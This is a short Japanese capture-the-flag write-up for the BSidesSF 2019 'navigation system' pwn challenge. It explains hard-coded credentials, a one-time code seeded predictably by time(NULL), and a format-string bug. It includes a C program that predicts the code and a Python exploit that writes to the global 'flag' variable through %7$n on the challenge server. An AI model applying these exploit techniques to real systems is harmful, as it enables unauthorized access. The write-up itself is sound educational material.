# [pwn 374pts] navigation system - BSidesSF 2019 CTF
32ビットバイナリでPIEは無効です。
```
$ checksec binary
[*] 'binary'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
最初にユーザー名とパスワードを聞かれますが、IDAで調べるとstrcmpで比較しており、それぞれ`test_account`、`test_password`だと分かります。
その後genOTPcodeでワンタイムコードが作られるので、これを当てる必要があります。
このコードは次のように生成されています。
```c
int genOTPcode(char* username, char* password) {
     srand(time(NULL) + username[0] + password[0]);
     return rand();
}
```
`time(NULL)`に依存するのでコードは予測可能です。
いっつもCで書いたバイナリ呼んでるけどpythonでできないのかな。
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
  srand(time(NULL) + 't' + 't');
  printf("%d", rand());
  return 0;
}
```
認証を全部クリアするとUserPanelが呼ばれます。
ここでは4つの機能があるのですが有効なのは2つだけです。
1つ目は`Read latest report`で、グローバル変数`flag`が0でなければ`report.txt`が読めます。
2つ目は`Set a station`で、stationというローカル変数に0x20バイトまで入力できます。
入力した内容はprintfでそのまま出力されるのでFormat String Exploitが可能です。
したがって、FSBでflagを1以上にしてから`Read latest report`を選択すればフラグが出力されます。
```python
from ptrlib import *
import subprocess

elf = ELF("./binary")

def getOTP():
    t = subprocess.check_output(["./ctime"])
    return int(t)

#sock = Process("./binary")
sock = Socket("185.66.87.233", 5002)
sock.recvuntil("Login: ")
sock.sendline("test_account")
sock.recvuntil("Password: ")
sock.sendline("test_password")
otp = getOTP()
sock.recvuntil("code: ")
sock.sendline(str(otp))
sock.recvuntil("> ")
sock.sendline("2")
sock.recvuntil("> ")
sock.send(p32(elf.symbol("flag")) + b"%7$n")
sock.interactive()
```

# 感想
簡単なFSBの問題ですね。
